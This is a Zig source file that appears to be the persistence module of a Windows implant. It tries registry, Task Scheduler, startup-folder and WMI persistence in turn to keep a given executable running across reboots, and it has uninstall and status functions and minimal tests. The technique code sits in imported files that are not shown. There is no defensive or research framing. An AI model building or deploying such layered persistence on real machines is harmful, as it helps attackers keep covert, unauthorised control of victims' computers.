const std = @import("std");
const registry = @import("persistence_registry.zig");
const scheduler = @import("persistence_scheduler.zig");
const startup = @import("persistence_startup.zig");
const wmi = @import("persistence_wmi.zig");

pub const PersistMethod = enum {
    Registry,
    TaskScheduler,
    StartupFolder,
    WMI,
};

pub const PersistResult = enum(u32) {
    Success = 0,
    Partial = 1,
    NoAdmin = 2,
    Failed = 3,
};

pub fn install(exe_path: []const u8, allocator: std.mem.Allocator) PersistResult {
    if (registry.install(exe_path)) return .Success;
    if (scheduler.install(exe_path)) return .Success;
    if (startup.install(exe_path, allocator)) return .Success;
    if (wmi.install(exe_path)) return .Success;
    return .Failed;
}

pub fn uninstall() PersistResult {
    var any_ok = false;
    if (registry.uninstall()) any_ok = true;
    if (scheduler.uninstall()) any_ok = true;
    if (startup.uninstall()) any_ok = true;
    if (wmi.uninstall()) any_ok = true;
    return if (any_ok) .Success else .Failed;
}

pub fn isInstalled() bool {
    return registry.isInstalled() or startup.isInstalled();
}

test "persistence install returns result without crash" {
    _ = install("C:\\test.exe", std.testing.allocator);
}

test "persistence uninstall returns result" {
    _ = uninstall();
}

test "persistence isInstalled no crash" {
    _ = isInstalled();
}
